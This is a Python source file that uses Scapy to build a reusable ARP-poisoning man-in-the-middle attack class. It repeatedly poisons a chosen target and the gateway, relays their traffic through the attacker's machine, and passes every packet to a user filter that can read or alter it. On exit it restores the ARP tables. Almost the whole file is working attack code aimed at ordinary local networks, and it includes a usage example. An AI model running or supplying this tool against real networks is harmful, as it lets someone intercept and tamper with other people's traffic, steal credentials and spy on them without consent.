from scapy.all import *
from threading import Thread
import time

class MITMAttack:
    """Represents an ARP MITM attack, including poisoning and restoring.
    Example usage: (no timeout or such specified,
    so will sniff until receives KeyboardInterrupt)
    >>> with MITMAttack(target_ip="10.0.0.2") as packets:
    ...     packets.summary()
    ...     # After this line, the ARP state will be restored

    Note that the "with" block will not start running until the attack finishes running.  """
    def __init__(self,
                 target_ip,
                 sniff_params={},
                 user_filter=lambda p: p,
                 verbose=True):
        """Initializes the object with information about the target,
        gateway and local machine. Does NOT start the poisoning.
        *target_ip*: the ip that will be attacked
        *sniff_params*: passed to bridge_and_sniff(). Used to specify timeout or stop_filter
        *user_filter*: similar to the xfrm arguments of bridge_and_sniff,
        applied in both directions of communication on the packet after it's patched by MITMAttack.
        Check `packet.direction` for the direction - 1 means from target to gateway, 0 for opposite.
        *verbose*: whether actions should be printed"""
        self.local_ip = get_if_addr(conf.iface)
        self.local_mac = get_if_hwaddr(conf.iface)

        self.gateway_ip = conf.route.route("0.0.0.0")[2]
        self.gateway_mac = get_mac(self.gateway_ip)

        self.target_ip = target_ip
        self.target_mac = get_mac(target_ip)

        self.sniff_params = sniff_params
        self.user_filter = user_filter

        self.verbose = verbose

        if self.verbose:
            print(f"Local: {self.local_ip.ljust(IP_LENGTH)}, {self.local_mac}")
            print(f"Gateway: {self.gateway_ip.ljust(IP_LENGTH)}, {self.gateway_mac}")
            print(f"Target: {self.target_ip.ljust(IP_LENGTH)}, {self.target_mac}")

    def __enter__(self):
        def poison_targets_async():
            t = threading.currentThread()
            while getattr(t, "running", True):
                if self.verbose: print("Re-poisoning")
                # Poison target - tell it I am the gateway
                poison_target(self.target_ip, self.target_mac, self.gateway_ip, self.local_mac, verbose=self.verbose)
                # Poison gateway - tell it I am the target
                poison_target(self.gateway_ip, self.gateway_mac, self.target_ip, self.local_mac, verbose=self.verbose)
                time.sleep(2)

        poison_thread = threading.Thread(target=poison_targets_async)
        if self.verbose: print("Launching poisoning thread.")
        poison_thread.start()

        packets = bridge_and_sniff(
                if1=conf.iface,
                if2=conf.iface,
                xfrm12=mitm_forward(self.target_mac, self.target_ip, self.local_mac, self.local_ip,
                    self.gateway_mac, self.gateway_ip, self.user_filter),
                **self.sniff_params,
                )
        poison_thread.running = False

        return packets

    def __exit__(self, type, value, traceback):
        if self.verbose: print("Restoring")
        # Restore target and gateway to talk to each other
        poison_target(self.target_ip, self.target_mac,
                self.gateway_ip, self.gateway_mac, verbose=self.verbose)
        poison_target(self.gateway_ip, self.gateway_mac,
                self.target_ip, self.target_mac, verbose=self.verbose)
        return False  # re-raise if there's an exception

IP_LENGTH = 15

def get_mac(target_ip, verbose=False):
    if verbose: print(f"Getting {target_ip}'s mac...")
    # Fun fact - this is already implemented in scapy function called getmacbyip
    arp_broadcast = Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(op=1, pdst=target_ip)  # op=1 is WHO(mac) HAS this ip
    response = srp(arp_broadcast, verbose=False)
    response = response[0][0][1]  # op should be 2 which means IS AT
    return response.hwsrc

def poison_target(target_ip, target_mac, ip, mac, verbose=True):
    """Make machine at (`target_ip`, `target_mac`) associate `ip` with `mac`"""
    if verbose:
        print(f"ARPing {target_ip.ljust(IP_LENGTH)} to set {ip.ljust(IP_LENGTH)}={mac}")
    poison = ARP(op=2, hwsrc=mac, psrc=ip, pdst=target_ip, hwdst=target_mac)
    send(poison, verbose=False)

def mitm_forward(target_mac, target_ip, local_mac, local_ip, gateway_mac, gateway_ip, user_filter):
    def convert(p):
        if IP not in p or Ether not in p: return False
        p_src_mac = p[Ether].src
        p_dst_mac = p[Ether].dst
        p_src_ip  = p[IP].src
        p_dst_ip  = p[IP].dst

        # target -> me -> gateway -> internet
        if p_src_mac == target_mac and p_dst_mac == local_mac:
            p[Ether].src = local_mac
            p[Ether].dst = gateway_mac
            p.direction = 1
            try:
                return user_filter(p)
            except Exception as e:
                print(e)
        # internet -> gateway -> me -> target
        elif p_src_mac == gateway_mac and p_dst_mac == local_mac and p_dst_ip == target_ip:
            p[Ether].src = local_mac
            p[Ether].dst = target_mac
            p.direction = 0
            try:
                return user_filter(p)
            except Exception as e:
                print(e)
        else:
            return False
    return convert

